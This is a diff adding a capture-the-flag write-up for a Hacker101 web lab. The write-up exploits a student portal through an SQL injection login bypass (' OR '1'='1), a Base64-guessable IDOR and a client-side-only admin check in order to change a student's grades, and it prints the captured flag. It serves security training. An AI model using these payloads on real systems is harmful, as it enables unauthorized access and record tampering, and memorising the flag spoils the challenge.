@@ -1,0 +1,66 @@
+================================
+LAB: Hacker101 CTF - OSU CTF (OSUSEC Student Management Portal)
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-03-02
+Lab URL: https://057cb4e06bd96d5a5ca723b09ddade7b.ctf.hacker101.com
+Category: Web
+Level: Moderate
+Objective: Modify Natasha Drew's grades to all A's to obtain the flag
+Description: Student management portal for OSUSEC. Login required. One flag.
+
+[RECONNAISSANCE]
+----------------
+- GET / -> 302 redirect to /login
+- GET /login -> 200, login form with username/password fields
+- POST /login (bad creds) -> 401, "Username/Password Combination is invalid" (Content-Length: 4404)
+- Directory fuzzing (common.txt, directory-list-2.3-medium.txt, POST methods) -> no routes found except /login
+- JS on login page checks cookie "token" client-side only (cosmetic modal display)
+- After auth: GET / returns dashboard with student table, each row has data-id (Base64 encoded)
+- JS file /assets/js/app.min.js loaded post-auth: activates /update-student/<id> links only if staff.admin === true
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+1. SQL Injection (Auth Bypass): login form vulnerable to classic OR-based SQLi
+   - No sanitization on username/password fields
+   - MySQL backend (confirmed by # comment behavior)
+
+2. IDOR (Insecure Direct Object Reference): /update-student/<base64_id> accessible without ownership check
+   - Logged in as rhonda.daniels, accessed Natasha Drew's record directly
+   - No server-side validation that the student belongs to the logged-in teacher
+
+3. Client-Side Access Control Bypass: staff.admin = false in JS prevents button click
+   - Server does NOT enforce this check on POST /update-student/<id>
+   - Direct POST bypasses JS restriction entirely
+
+[EXPLOITATION]
+--------------
+Step 1 - SQLi Auth Bypass:
+payload : ' OR '1'='1 in both fields username and password.
+
+Step 2 - Generate Natasha's ID:
+"Natasha_Drew" -> Base64 -> TmF0YXNoYV9EcmV3
+
+Step 3 - IDOR to access Natasha's grade form:
+GET /update-student/TmF0YXNoYV9EcmV3
+Result: 200, form with student_hash=0cb3ed2d3f0ab69096c695b450d22010, grades all F/E
+
+Step 4 - Bypass client-side control, POST grades directly:
+POST /update-student/TmF0YXNoYV9EcmV3
+Body: student_hash=0cb3ed2d3f0ab69096c695b450d22010&grade_english=A&grade_science=A&grade_maths=A
+Result: 200, flag displayed
+
+[EVIDENCE]
+----------
+Flag: ^FLAG^8a0db9a9132136e0f35573282039de1e6a4a67d81aad9ff711f52f459700cab9$FLAG$
+Server message: "Awesome! Natasha has got top marks and can now attend Hacker Camp!!!!"
+
+[LESSONS LEARNED]
+-----------------
+- Never rely on client-side JS checks for access control (admin flags, button states)
+- IDOR: always verify server-side that the requesting user owns/has rights to the resource
+- SQLi: parameterized queries / prepared statements prevent OR-based auth bypass
+- Base64 is encoding, not encryption - never use it as a security mechanism for IDs
+- Student IDs followed predictable pattern (Firstname_Lastname) making enumeration trivial
